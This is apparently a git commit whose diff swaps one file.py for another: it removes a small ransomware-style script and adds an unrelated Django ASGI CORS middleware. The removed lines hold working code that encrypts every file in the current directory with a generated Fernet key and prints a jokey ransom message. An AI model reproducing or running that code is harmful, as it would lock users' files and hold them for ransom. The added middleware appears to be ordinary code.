1d42f448e2a10d252b425cd980d3ca5398d1bde1
Ronnie <ronnie94official@gmail.com>
2024-02-05 14:27:55 +0000

    Update file.py

--- file.py
+++ file.py
@@ -1,26 +1,114 @@
-#!/usr/bin/env python3
+from fnmatch import fnmatchcase
+from typing import cast
 
-import os
-from cryptography.fernet import Fernet
+from asgiref.typing import (
+    ASGI3Application,
+    ASGIReceiveCallable,
+    ASGISendCallable,
+    ASGISendEvent,
+    HTTPResponseBodyEvent,
+    HTTPResponseStartEvent,
+    HTTPScope,
+    Scope,
+)
+from django.conf import settings
 
-files = []
-for file in os.listdir():
-    if file == "voldemort.py" or file == "wand.key" or file == "harry.py":
-        continue
-    if os.path.isfile(file):
-        files.append(file)
 
-print(files)
-
-key = Fernet.generate_key()
-with open("wand.key", "wb") as wand:
-    wand.write(key)
-    for file in files:
-        with open(file, "rb") as thefile:
-            contents = thefile.read()
-            contents_encrypted = Fernet(key).encrypt(contents)
-            with open(file, "wb") as thefile:
-                thefile.write(contents_encrypted)
-                print(
-                    "all your files are locked, send me coffee or they are avada cadavrad"
+def cors_handler(application: ASGI3Application) -> ASGI3Application:
+    async def cors_wrapper(
+        scope: Scope, receive: ASGIReceiveCallable, send: ASGISendCallable
+    ) -> None:
+        # handle CORS preflight requests
+        if scope["type"] != "http":
+            await application(scope, receive, send)
+            return
+        # determine the origin of the request
+        request_origin: str = ""
+        for header, value in scope.get("headers", []):
+            if header == b"origin":
+                request_origin = value.decode("latin1")
+        # if the origin is allowed, add the appropriate CORS headers
+        origin_match = False
+        if request_origin:
+            for allowed_origin in settings.ALLOWED_GRAPHQL_ORIGINS:
+                if fnmatchcase(request_origin, allowed_origin):
+                    origin_match = True
+                    break
+        if scope["method"] == "OPTIONS":
+            scope = cast(HTTPScope, scope)
+            response_headers: list[tuple[bytes, bytes]] = [
+                (b"access-control-allow-credentials", b"true"),
+                (
+                    b"access-control-allow-headers",
+                    b"Origin, Content-Type, Accept, Authorization, "
+                    b"Authorization-Bearer",
+                ),
+                (b"access-control-allow-methods", b"POST, OPTIONS"),
+                (b"access-control-max-age", b"600"),
+                (b"vary", b"Origin"),
+            ]
+            if origin_match:
+                response_headers.append(
+                    (
+                        b"access-control-allow-origin",
+                        request_origin.encode("latin1"),
+                    )
                 )
+            await send(
+                HTTPResponseStartEvent(
+                    type="http.response.start",
+                    status=200 if origin_match else 400,
+                    headers=sorted(response_headers),
+                    trailers=False,
+                )
+            )
+            await send(
+                HTTPResponseBodyEvent(
+                    type="http.response.body", body=b"", more_body=False
+                )
+            )
+        else:
+
+            async def send_with_origin(message: ASGISendEvent) -> None:
+                if message["type"] == "http.response.start":
+                    response_headers = [
+                        (key, value)
+                        for key, value in message["headers"]
+                        if key.lower()
+                        not in {
+                            b"access-control-allow-credentials",
+                            b"access-control-allow-origin",
+                            b"vary",
+                        }
+                    ]
+                    response_headers.append(
+                        (b"access-control-allow-credentials", b"true")
+                    )
+                    vary_header = next(
+                        (
+                            value
+                            for key, value in message["headers"]
+                            if key.lower() == b"vary"
+                        ),
+                        b"",
+                    )
+                    if origin_match:
+                        response_headers.append(
+                            (
+                                b"access-control-allow-origin",
+                                request_origin.encode("latin1"),
+                            )
+                        )
+                        if b"Origin" not in vary_header:
+                            if vary_header:
+                                vary_header += b", Origin"
+                            else:
+                                vary_header = b"Origin"
+                    if vary_header:
+                        response_headers.append((b"vary", vary_header))
+                    message["headers"] = sorted(response_headers)
+                await send(message)
+
+            await application(scope, receive, send_with_origin)
+
+    return cors_wrapper
